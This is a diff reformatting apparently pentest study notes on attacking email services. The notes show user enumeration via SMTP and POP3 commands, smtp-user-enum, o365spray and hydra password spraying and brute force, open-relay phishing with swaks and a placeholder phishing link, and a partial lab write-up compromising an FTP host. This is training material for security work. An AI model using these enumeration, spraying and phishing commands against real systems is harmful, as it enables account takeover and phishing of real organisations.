     GW -->|"<b>3.</b> Fake IP<br/>192.168.225.110"| V
     V -->|"<b>4.</b> Connects to"| F
     V -.->|"<b>Ping:</b> inlanefreight.com<br/>→ 192.168.225.110"| A
-    
+
     %% Styling
     style V fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
     style GW fill:#4a5a8b,stroke:#9b87f5,stroke-width:3px,color:#fff
     style A fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
     style F fill:#8b6a3a,stroke:#ff9500,stroke-width:3px,color:#fff
-    
+
     %% Link styling
     linkStyle 0 stroke:#6c8ebf,stroke-width:3px
     linkStyle 1 stroke:#ff6b6b,stroke-width:4px,stroke-dasharray:5
@@ -2626,69 +3636,141 @@ flowchart TD
 <summary><h2>Enumeration</h2></summary>
 
 **Why Email Servers Are Complex**
-* Organizations often deploy multiple servers, ports, and services.
-* Many companies now outsource email to the cloud (e.g., Microsoft 365, Google Workspace / G-Suite).
-* Attack surface and techniques differ depending on the provider or on-premises setup.
+
+- Organizations often deploy multiple servers, ports, and services.
+- Many companies now outsource email to the cloud (e.g., Microsoft 365, Google Workspace / G-Suite).
+- Attack surface and techniques differ depending on the provider or on-premises setup.
 
 **Identifying Mail Servers with MX Records**
-* **MX (Mail eXchanger) Record:**
-    * A DNS record that specifies the mail server(s) responsible for accepting emails for a domain.
-    * Each MX record points to a hostname of a mail server.
 
-* **Multiple MX Records:**
-    * Organizations often publish several MX records.
-    * Purpose:
-        * Load balancing: distribute incoming mail across multiple servers.
-        * Redundancy: provide backup if one server fails.
+- **MX (Mail eXchanger) Record:**
+  - A DNS record that specifies the mail server(s) responsible for accepting emails for a domain.
+  - Each MX record points to a hostname of a mail server.
+
+- **Multiple MX Records:**
+  - Organizations often publish several MX records.
+  - Purpose:
+    - Load balancing: distribute incoming mail across multiple servers.
+    - Redundancy: provide backup if one server fails.
 
 We can use tools such as host or dig and online websites such as MXToolbox to query information about the MX records:
 
 **Option 1: Host - MX Records**
-```bash 
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 host -t MX hackthebox.eu
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # hackthebox.eu mail is handled by 1 aspmx.l.google.com.
 ```
-```bash 
+
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 host -t MX microsoft.com
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
 ```
 
+</td></tr>
+</table>
+
 **Option 2: DIG - MX Records**
-```bash 
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 dig mx plaintext.do | grep "MX" | grep -v ";"
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
 # plaintext.do.           7076    IN      MX      10 mx.zoho.com.
 # plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
 ```
-```bash 
+
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 dig mx inlanefreight.com | grep "MX" | grep -v ";"
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
 ```
 
+</td></tr>
+</table>
+
 **Option 3: Host - A Records**
-```bash 
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 host -t A mail1.inlanefreight.htb
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # mail1.inlanefreight.htb has address 10.129.14.128
 ```
 
+</td></tr>
+</table>
+
 **Why This Matters**
 
-* Cloud Providers:
-    * Use modern authentication.
-    * Introduce unique attack vectors per provider.
-* Custom Mail Servers:
-    * May expose misconfigurations.
-    * Can allow classic attacks against mail protocols.
+- Cloud Providers:
+  - Use modern authentication.
+  - Introduce unique attack vectors per provider.
+- Custom Mail Servers:
+  - May expose misconfigurations.
+  - Can allow classic attacks against mail protocols.
 
 **Common Ports for Mail Services**
 
@@ -2704,19 +3786,32 @@ host -t A mail1.inlanefreight.htb
 
 We can use Nmap's default script -sC option to enumerate those ports on the target system:
 
-```bash 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 <TARGET_IP>
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
 # Nmap scan report for <TARGET_IP>
 # Host is up (0.00025s latency).
 
 # PORT   STATE SERVICE VERSION
 # 25/tcp open  smtp    Postfix smtpd
-# |_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
+# |_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
 # MAC Address: 00:00:00:00:00:00 (VMware)
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -2728,14 +3823,20 @@ However, misconfigurations can expose sensitive information or allow abuse.
 
 **Common Misconfiguration**
 
-* Anonymous authentication enabled on the SMTP service.
-* Insecure protocols or commands that can be used to enumerate valid usernames.
+- Anonymous authentication enabled on the SMTP service.
+- Insecure protocols or commands that can be used to enumerate valid usernames.
 
 **Authentication and User Enumeration**
 
 SMTP supports commands that can be abused to enumerate valid users on a mail server:
-* **VRFY** → Verify if a username/email exists.
-```bash 
+
+- **VRFY** → Verify if a username/email exists.
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 telnet <TARGET_IP> 25
 
 # Trying <TARGET_IP>...
@@ -2752,8 +3853,17 @@ VRFY www-data
 VRFY new-user
 # 550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
 ```
-* EXPN → Expand mailing lists into actual usernames.
-```bash 
+
+</td></tr>
+</table>
+
+- EXPN → Expand mailing lists into actual usernames.
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 telnet <TARGET_IP> 25
 
 # Trying <TARGET_IP>...
@@ -2768,8 +3878,17 @@ EXPN support-team
 # 250 2.0.0 carol@inlanefreight.htb
 # 250 2.1.5 elisa@inlanefreight.htb
 ```
-* RCPT TO → Used during email delivery; server responses can reveal if a recipient exists.
-```bash 
+
+</td></tr>
+</table>
+
+- RCPT TO → Used during email delivery; server responses can reveal if a recipient exists.
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 telnet <TARGET_IP> 25
 
 # Trying <TARGET_IP>...
@@ -2790,8 +3909,17 @@ RCPT TO:kate
 RCPT TO:john
 # 250 2.1.5 john... Recipient ok
 ```
-* USER → Used followed by the username, and if the server responds OK. This means that the user exists on the server.
-```bash 
+
+</td></tr>
+</table>
+
+- USER → Used followed by the username, and if the server responds OK. This means that the user exists on the server.
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 telnet <TARGET_IP> 110
 
 # Trying <TARGET_IP>...
@@ -2806,16 +3934,38 @@ USER john
 # +OK
 ```
 
+</td></tr>
+</table>
+
 **Automating with `smtp-user-enum`**
 
 Instead of manual testing, use smtp-user-enum to automate enumeration.
 
-```bash 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 smtp-user-enum -M <MODE> -U <USER_LIST> -D <DOMAIN> -t <TARGET_IP>
 ```
-```bash 
-smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
 
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
+smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
 
 #  ----------------------------------------------------------
@@ -2841,16 +3991,19 @@ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
 # 78 queries in 11 seconds (7.1 queries / sec)
 ```
 
+</td></tr>
+</table>
+
 **Enumeration Process**
 
-```mermaid 
+```mermaid
 flowchart TD
     %% Nodes
     A["<b>🔴 Attacker</b>"]
     S["<b>SMTP Server</b><br/>Port 25/587"]
     P["<b>POP3 Server</b><br/>Port 110/995"]
     R["<b>📋 Valid Users List</b><br/>Enumerated"]
-    
+
     %% Connections
     A -->|"<b>1.</b> SMTP VRFY/EXPN<br/>RCPT TO commands"| S
     A -->|"<b>2.</b> POP3 USER<br/>command"| P
@@ -2858,13 +4011,13 @@ flowchart TD
     P -->|"<b>4.</b> +OK/-ERR<br/>responses"| A
     A -->|"<b>5.</b> Automate with<br/>smtp-user-enum"| S
     A -.->|"<b>Results</b>"| R
-    
+
     %% Styling
     style A fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
     style S fill:#4a5a8b,stroke:#6c8ebf,stroke-width:3px,color:#fff
     style P fill:#4a5a8b,stroke:#6c8ebf,stroke-width:3px,color:#fff
     style R fill:#3d5a40,stroke:#9ACD32,stroke-width:3px,color:#fff
-    
+
     %% Link styling
     linkStyle 0 stroke:#ff6b6b,stroke-width:3px
     linkStyle 1 stroke:#ff6b6b,stroke-width:3px
@@ -2887,13 +4040,33 @@ As discussed, cloud service providers use their own implementation for email ser
 [O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365). This tool reimplements a collection of enumeration and spray techniques researched and identified by those mentioned in [Acknowledgments](https://github.com/0xZDH/o365spray#Acknowledgments).
 
 **Step 1: Validate if our target domain is using Office 365**
-```bash 
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 python3 o365spray.py --validate --domain <DOMAIN>
 ```
-```bash 
-python3 o365spray.py --validate --domain msplaintext.xyz
 
-#             *** O365 Spray ***            
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
+python3 o365spray.py --validate --domain msplaintext.xyz
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+#             *** O365 Spray ***
 
 # >----------------------------------------<
 
@@ -2909,14 +4082,37 @@ python3 o365spray.py --validate --domain msplaintext.xyz
 # [2025-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
 ```
 
+</td></tr>
+</table>
+
 **Step 1: Attempt to identify usernames**
-```bash 
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 python3 o365spray.py --enum -U <USERNAME_LIST> --domain <DOMAIN>
 ```
-```bash 
-python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
-                                       
-#             *** O365 Spray ***             
+
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
+python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+#             *** O365 Spray ***
 
 # >----------------------------------------<
 
@@ -2936,14 +4132,16 @@ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
 # [2025-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
 # [2025-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
 # [2025-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
-# [2025-04-13 09:48:10,415] INFO : 
+# [2025-04-13 09:48:10,415] INFO :
 
 # [ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2504130948.txt'
 # [ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2504130948.txt'
 
 # [2025-04-13 09:48:10,416] INFO : Valid Accounts: 2
-
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -2954,37 +4152,58 @@ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
 
 We can use different tools to perform a password spray or brute force against email services such as SMTP, POP3, or IMAP4. First, we need to get a username list and a password list and specify which service we want to attack.
 
-Cloud services that support **SMTP**, **POP3**, or **IMAP4** may be vulnerable to password spraying.  
+Cloud services that support **SMTP**, **POP3**, or **IMAP4** may be vulnerable to password spraying.
 
 **Common Approaches**
-* **Traditional Tools**
-    * Hydra  ⚠️ Usually blocked by providers  
 
-- **Custom / Specialized Tools**
-    * [o365spray](https://github.com/0xZDH/o365spray) → Microsoft Office 365  
-    * [MailSniper](https://github.com/dafthack/MailSniper) → Microsoft Office 365  
-    * [CredKing](https://github.com/ustayready/CredKing) → Gmail / Okta  
+- **Traditional Tools**
+  - Hydra ⚠️ Usually blocked by providers
+
+* **Custom / Specialized Tools**
+  - [o365spray](https://github.com/0xZDH/o365spray) → Microsoft Office 365
+  - [MailSniper](https://github.com/dafthack/MailSniper) → Microsoft Office 365
+  - [CredKing](https://github.com/ustayready/CredKing) → Gmail / Okta
 
 **Important Considerations**
-* Tools must always be **up-to-date**:
-    * Cloud providers frequently change authentication flows and protections  
-    * Outdated tools may fail silently  
 
-* Security professionals should:
-    * Understand **how tools work internally**  
-    * Have the ability to **modify or extend** tools when they break  
+- Tools must always be **up-to-date**:
+  - Cloud providers frequently change authentication flows and protections
+  - Outdated tools may fail silently
 
+- Security professionals should:
+  - Understand **how tools work internally**
+  - Have the ability to **modify or extend** tools when they break
 
 <details>
 <summary><h3>Hydra - Password Attack</h3></summary>
 
 **Execute hydra against the service**
-```bash 
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 hydra -L <USERNAME_LIST> -p '<PASSWORD_LIST>' -f <TARGET_IP> <SERVICE>
 ```
-```bash 
-hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
 
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
+hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 # Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-13 11:37:46
@@ -2993,21 +4212,42 @@ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
 # [DATA] attacking pop3://10.10.110.20:110/
 # [110][pop3] host: 10.129.42.197   login: john   password: Company01!
 # 1 of 1 target successfully completed, 1 valid password found
-
 ```
+
+</td></tr>
+</table>
 
 </details>
 
 <details>
 <summary><h3>O365 Spray - Password Spraying</h3></summary>
 
-```bash 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 python3 o365spray.py --spray -U <USERNAME_LIST> -p '<PASSWORD>' --count 1 --lockout 1 --domain <DOMAIN>
 ```
-```bash 
-python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
 
-#             *** O365 Spray ***            
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
+python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+#             *** O365 Spray ***
 
 # >----------------------------------------<
 
@@ -3031,13 +4271,16 @@ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --locko
 # [2025-04-14 12:26:32,202] INFO : Running password spray against 2 users.
 # [2025-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2025!']
 # [2025-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2025!
-# [2025-04-14 12:26:33,048] INFO : 
+# [2025-04-14 12:26:33,048] INFO :
 
 # [ * ] Writing valid credentials to: '/opt/o365spray/spray/spray_valid_credentials.2504141226.txt'
 # [ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2504141226.txt'
 
 # [2025-04-14 12:26:33,048] INFO : Valid Credentials: 1
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -3053,10 +4296,20 @@ An open relay is a Simple Mail Transfer Protocol (**SMTP**) server, which is imp
 
 From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information. With the nmap smtp-open-relay script, we can identify if an SMTP port allows an open relay.
 
-```bash 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 nmap -p25 -Pn --script smtp-open-relay <TARGET_IP>
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
 # Nmap scan report for <TARGET_IP>
 # Host is up (0.28s latency).
@@ -3066,12 +4319,25 @@ nmap -p25 -Pn --script smtp-open-relay <TARGET_IP>
 # |_smtp-open-relay: Server is an open relay (14/16 tests)
 ```
 
+</td></tr>
+</table>
+
 Next, we can use any mail client to connect to the mail server and send our email.
 
-```bash 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # === Trying 10.10.11.213:25...
 # === Connected to 10.10.11.213.
 # <-  220 mail.localdomain SMTP Mailer ready
@@ -3094,16 +4360,19 @@ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --
 #  -> Subject: Company Notification
 #  -> Message-Id: <20201029013606.775675@parrot>
 #  -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
-#  -> 
+#  ->
 #  -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
-#  -> 
-#  -> 
+#  ->
+#  ->
 #  -> .
 # <-  250 OK
 #  -> QUIT
 # <-  221 Bye
 # === Connection closed with remote host.
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -3121,7 +4390,7 @@ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --
 
 We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format:
 
-* **HTB{...}**
+- **HTB{...}**
 
 Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.
 
@@ -3130,10 +4399,20 @@ Our task is to review the security of each of the three servers and present it t
 
 I started enumerating the ports, their service version and running the default scripts to have a big picture of my target machine.
 
-```bash 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 nmap -p- -sC -sV -Pn -n 10.129.203.7
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Nmap scan report for 10.129.203.7
 # Host is up (0.066s latency).
 # Not shown: 65528 filtered tcp ports (no-response)
@@ -3144,12 +4423,12 @@ nmap -p- -sC -sV -Pn -n 10.129.203.7
 # | Not valid before: 2022-04-21T19:27:17
 # |_Not valid after:  2032-04-18T19:27:17
 # |_ssl-date: 2025-09-19T02:49:22+00:00; 0s from scanner time.
-# | fingerprint-strings: 
-# |   GenericLines: 
+# | fingerprint-strings:
+# |   GenericLines:
 # |     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
 # |     Command unknown, not supported or not allowed...
 # |     Command unknown, not supported or not allowed...
-# |   NULL: 
+# |   NULL:
 # |_    220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
 # 80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
 # |_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
@@ -3160,8 +4439,8 @@ nmap -p- -sC -sV -Pn -n 10.129.203.7
 # | Not valid before: 2022-04-21T19:27:17
 # |_Not valid after:  2032-04-18T19:27:17
 # |_http-server-header: Core FTP HTTPS Server
-# | fingerprint-strings: 
-# |   FourOhFourRequest: 
+# | fingerprint-strings:
+# |   FourOhFourRequest:
 # |     HTTP/1.1 401 Unauthorized
 # |     Date:Fri, 19 Aug 2025 02:47:26 GMT
 # |     Server: Core FTP HTTPS Server
@@ -3174,9 +4453,9 @@ nmap -p- -sC -sV -Pn -n 10.129.203.7
 # |     HTTP/1.1 401 Unauthorized
 # |     </BODY>
 # |     </HTML>
-# |   GenericLines, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+# |   GenericLines, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
 # |     Command Not Recognized
-# |   GetRequest: 
+# |   GetRequest:
 # |     HTTP/1.1 401 Unauthorized
 # |     Date:Fri, 19 Aug 2025 02:47:25 GMT
 # |     Server: Core FTP HTTPS Server
@@ -3191,7 +4470,7 @@ nmap -p- -sC -sV -Pn -n 10.129.203.7
 # |_    </HTML>
 # |_ssl-date: 2025-09-19T02:49:21+00:00; 0s from scanner time.
 # 3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
-# | mysql-info: 
+# | mysql-info:
 # |   Protocol: 10
 # |   Version: 5.5.5-10.4.24-MariaDB
 # |   Thread ID: 20
@@ -3204,7 +4483,7 @@ nmap -p- -sC -sV -Pn -n 10.129.203.7
 # | ssl-cert: Subject: commonName=WIN-EASY
 # | Not valid before: 2025-09-18T00:48:49
 # |_Not valid after:  2026-03-20T00:48:49
-# | rdp-ntlm-info: 
+# | rdp-ntlm-info:
 # |   Target_Name: WIN-EASY
 # |   NetBIOS_Domain_Name: WIN-EASY
 # |   NetBIOS_Computer_Name: WIN-EASY
@@ -3218,6 +4497,9 @@ nmap -p- -sC -sV -Pn -n 10.129.203.7
 
 # Nmap done: 1 IP address (1 host up) scanned in 253.05 seconds
 ```
+
+</td></tr>
+</table>
 
 ```mermaid
 sequenceDiagram
@@ -3244,10 +4526,20 @@ flowchart TD
     B -->|"2️⃣ Valid user response"| C[✅ Valid User Identified]:::success
 ```
 
-```bash 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 smtp-user-enum -M RCPT -U ~/Downloads/users.list -t 10.129.203.7 -D inlanefreight.htb
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
 
 #  ----------------------------------------------------------
@@ -3271,6 +4563,9 @@ smtp-user-enum -M RCPT -U ~/Downloads/users.list -t 10.129.203.7 -D inlanefreigh
 # 79 queries in 6 seconds (13.2 queries / sec)
 ```
 
+</td></tr>
+</table>
+
 This proved successful, confirming the existence of a valid user account: `<USER>`.
 
 </details>
@@ -3293,10 +4588,20 @@ flowchart LR
     B -->|"2️⃣ Valid password discovered"| C[🗝️ Credentials Found]:::success
 ```
 
-```bash 
-hydra -l <USER> -P /usr/share/wordlists/rockyou.txt  -t 1 10.129.203.7 ftp -vV
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
+hydra -l <USER> -P /usr/share/wordlists/rockyou.txt -t 1 10.129.203.7 ftp -vV
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 # Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-18 21:00:12
@@ -3314,6 +4619,9 @@ hydra -l <USER> -P /usr/share/wordlists/rockyou.txt  -t 1 10.129.203.7 ftp -vV
 # Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-18 21:00:54
 ```
 
+</td></tr>
+</table>
+
 </details>
 
 <details>
@@ -3321,17 +4629,20 @@ hydra -l <USER> -P /usr/share/wordlists/rockyou.txt  -t 1 10.129.203.7 ftp -vV
 
 Upon gaining access to the FTP server with the compromised credentials, I proceeded with internal enumeration. I resolved a common FTP client issue with the ls command by adjusting the connection mode, which then allowed for directory listing.
 
-```bash 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 ftp 10.129.203.7
-```
-```bash 
+
 # Connected to 10.129.203.7.
 # 220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
 Name (10.129.203.7:root): <USER>
 # 331 password required for <USER>
 Password: <PASSWORD>
 # 230-Logged on
-# 230 
+# 230
 # Remote system type is UNIX.
 # Using binary mode to transfer files.
 ftp> passive
@@ -3346,14 +4657,14 @@ ftp> get docs.txt
 # local: docs.txt remote: docs.txt
 # 200 PORT command successful
 # 150 RETR command started
-#     55       24.44 KiB/s 
+#     55       24.44 KiB/s
 # 226 Transfer Complete
 # 55 bytes received in 00:00 (1.30 KiB/s)
 ftp> get WebServersInfo.txt
 # local: WebServersInfo.txt remote: WebServersInfo.txt
 # 200 PORT command successful
 # 150 RETR command started
-#    255        2.58 MiB/s 
+#    255        2.58 MiB/s
 # 226 Transfer Complete
 # 255 bytes received in 00:00 (6.21 KiB/s)
 ftp> quit
@@ -3361,12 +4672,43 @@ ftp> quit
 # 221 Goodbye
 ```
 
-```bash 
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 cat docs.txt
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # I'm testing the FTP using HTTPS, everything looks good.
 ```
-```bash 
-cat WebServersInfo.txt 
+
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
+cat WebServersInfo.txt
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # CoreFTP:
 # Directory C:\CoreFTP
 # Ports: 21 & 443
@@ -3377,22 +4719,61 @@ cat WebServersInfo.txt
 # Ports: 80 & 4443
 # Test Command: curl http://localhost/test.php
 ```
-```bash 
-curl -k -H “Host: localhost” – basic -u <USER>:<PASSWORD> https://10.129.203.7/docs.txt
+
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
+curl -k -H "Host: localhost" – basic -u <USER>:<PASSWORD> https://10.129.203.7/docs.txt
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # curl: (6) Could not resolve host: xn--localhost-tc0e
 # curl: (6) Could not resolve host: xn--7ug
 # curl: (6) Could not resolve host: basic
 # I'm testing the FTP using HTTPS, everything looks good.
 ```
-```bash 
+
+</td></tr>
+</table>
+
+<table width="100%">
